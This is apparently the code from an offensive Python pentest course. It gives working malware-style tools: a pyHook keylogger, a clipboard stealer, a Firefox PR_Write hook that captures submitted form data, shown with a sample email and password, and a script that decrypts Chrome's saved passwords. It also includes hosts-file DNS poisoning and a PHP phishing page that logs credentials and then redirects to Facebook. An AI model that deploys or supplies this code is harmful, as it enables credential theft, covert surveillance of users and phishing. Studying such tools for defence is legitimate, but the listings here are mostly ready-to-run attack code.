["```\n# Python For Offensive PenTest\n\n# pyHook download link\n# http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/\n\n# pythoncom download link\n# http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/\n\n# Keylogger\n\nimport pythoncom, pyHook\n\n#Again, once the user hit any keyboard button, keypressed func will be executed and that action will be store in event\n\ndef keypressed(event):\n\n    global store\n\n#Enter and backspace are not handled properly that's why we hardcode their values to < Enter > and <BACK SPACE>\n# note that we can know if the user input was enter or backspace based on their ASCII values\n\n    if event.Ascii==13:\n        keys=' < Enter > ' \n    elif event.Ascii==8:\n        keys=' <BACK SPACE> '\n\n    else:\n        keys=chr(event.Ascii)\n\n    store = store + keys #at the end we append the ascii keys into store variable and finally write them in keylogs text file\n\n    fp=open(\"keylogs.txt\",\"w\")\n    fp.write(store)\n    fp.close()\n\n    return True # after intercepting the keyboard we have to return a True value otherwise we will simply disable the keyboard functionality\n\nstore = '' # string where we will store all the pressed keys\n\n#Next we create and register a hook manager and once the user hit any keyboard button, keypressed \n#func will be executed and that action will be store in event\n\nobj = pyHook.HookManager()\nobj.KeyDown = keypressed\n\nobj.HookKeyboard() #start the hooking loop and pump out the messages\npythoncom.PumpMessages() #remember that per pyHook documentation we must have a Windows message pump\n```", "```\nkeylogger test \nhello from python  \n```", "```\nkeyloffe <BACK SPACE> <BACK SPACE> <BACK SPACE> gger test <Enter> hello from python\n```", "```\nimport pyperclip\nimport time\n```", "```\nlist = []\n```", "```\nwhile True: # infifnite loop to continously check the clipboard\n\n    if pyperclip.paste() != 'None': # if the clipboard content is not empty ...\n        value = pyperclip.paste() # then we will take its value and put it into variable called value\n        #print pyperclip.paste()\n\n        if value not in list: #now to make sure that we don't get replicated items in our list before appending the value variable into our list\n                                 #we gonna check if the value is stored earlier in the first place, if not then this means this is a new item\n                                 #and we will append it to our list\n\n            list.append(value)\n        print list\n\n        time.sleep(3)\n```", "```\n# Python For Offensive PenTest\n\n# Download Link https://pypi.python.org/pypi/pyperclip/1.5.11\n\n# Clipboard Hijacking\n\nimport pyperclip\nimport time\n\nlist = [] # we create a list which will store the clipboard content\n\nwhile True: # infinite loop to continuously check the clipboard\n\n    if pyperclip.paste() != 'None': # if the clipboard content is not empty ...\n        value = pyperclip.paste() # then we will take its value and put it into variable called value\n        #print pyperclip.paste()\n\n        if value not in list: #now to make sure that we don't get replicated items in our list before appending the value variable into our list\n                                 #we gonna check if the value is stored earlier in the first place, if not then this means this is a new item\n                                 #and we will append it to our list\n\n            list.append(value)\n        print list\n\n        time.sleep(3)\n```", "```\nmail%5D= bigtasty321%40gmail.com\npassword%5D= %58123justyouandme%5D\n```", "```\nmail%5D= bigtasty321@gmail.com\npassword%5D= [123justyouandme]\n```", "```\n...\ndebug = Debug(MyEventHandler()) # Create a debug object instance\ntry:\n    for ( process, name ) in debug.system.find_processes_by_filename( \"firefox.exe\" ): # Search for Firefox.exe process, if found \n        print '[+] Found Firefox PID is ' + str (process.get_pid()) # Grab the Process ID (PID)\n    debug.attach( process.get_pid() ) # Attach to the process.\n    debug.loop()\n...\n```", "```\n...\nclass MyEventHandler( EventHandler ):\n\n    def load_dll( self, event ):\n\n        module = event.get_module() # Get the module object\n        if module.match_name(\"nss3.dll\"): # If it's nss3.dll ,then \n            pid = event.get_pid() # Get the process ID\n            address = module.resolve( \"PR_Write\" ) # Get the address of PR_Write\n            print '[+] Found PR_Write at addr ' + str(address)\n            event.debug.hook_function( pid, address, preCB=PR_Write, postCB=None ,paramCount=3,signature=None)\n...\n```", "```\ndef PR_Write(event, ra, arg1, arg2, arg3):\n```", "```\nprint process.read(arg2,1024)\n```", "```\n# Python For Offensive PenTest\n\n# Installing win32crypt\n# http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/\n\n# Dumping Google Chrome Passwords \n\nfrom os import getenv # To find out the Chrome SQL path which is >> C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\nimport sqlite3 # To read the Chrome SQLite DB\nimport win32crypt # High level library to call windows API CryptUnprotectData\nfrom shutil import copyfile # To make a copy of the Chrome SQLite DB\n\n# LOCALAPPDATA is a Windows Environment Variable which points to >>> C:\\Users\\{username}\\AppData\\Local\n\npath = getenv(\"LOCALAPPDATA\") + \"\\Google\\Chrome\\User Data\\Default\\Login Data\"\n\n# IF the target was logging into a site which has an entry into the DB, then sometimes reading the Chrome DB will return an error that the DB is locked \n# OperationalError: database is locked\n# The Workaround for this, is to make a copy the Login Data DB and pull data out of the copied DB\n\npath2 = getenv(\"LOCALAPPDATA\") + \"\\Google\\Chrome\\User Data\\Default\\Login2\"\ncopyfile(path, path2)\n...\n```", "```\n...\n# Connect to the copied Database\nconn = sqlite3.connect(path2)\n\ncursor = conn.cursor() # Create a Cursor object and call its execute() method to perform SQL commands like SELECT\n\n# SELECT column_name,column_name FROM table_name\n# SELECT action_url and username_value and password_value FROM table logins\ncursor.execute('SELECT action_url, username_value, password_value FROM logins') \n...\n```", "```\n...\n# To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.\nfor raw in cursor.fetchall():\n\n    print raw[0] + '\\n' + raw[1] # print the action_url (raw[0]) and print the username_value (raw[1])\n...\n```", "```\n...    \npassword = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it \n    print password # print the password in clear text\n\nconn.close()\n```", "```\necho 10.10.10.100 www.google.jo >> hosts\n```", "```\nipconfig /flushdns\n```", "```\nipconfig /flushdns\n```", "```\n# Python For Offensive PenTest\n\n# DNS_Poisoning\n\nimport subprocess\nimport os\n\nos.chdir(\"C:\\Windows\\System32\\drivers\\etc\") # change the script directory to ..\\etc where the host file is located on windows\n\ncommand = \"echo 10.10.10.100 www.google.jo >> hosts\" # Append this line to the host file, where it should redirect\n                                                      # traffic going to google.jo to IP of 10.10.10.100\nCMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\ncommand = \"ipconfig /flushdns\" # flush the cached dns, to make sure that new sessions will take the new DNS record\nCMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n```", "```\n...\n   windows = [{'script': \"DNS.py\", 'uac_info': \"requireAdministrator\"}],\n...\n```", "```\n<?php\nheader(\"Location: http://www.facebook.com/home.php? \");\n$handle = fopen(\"passwords.txt\", \"a\");\nforeach($_GET as $variable => $value) {\nfwrite($handle, $variable);\nfwrite($handle, \"=\");\nfwrite($handle, $value);\nfwrite($handle, \"\\r\\n\");\n}\nfwrite($handle, \"\\r\\n\");\nfclose($handle);\nexit;\n?> \n```", "```\nifconfig eth0\n```", "```\nservice apache2 start\n```", "```\nnetstat -antp | grep \"80\"\n```", "```\nchmod -R 777 /var/www/\n```", "```\nservice apache2 stop\nservice apache2 start \n```"]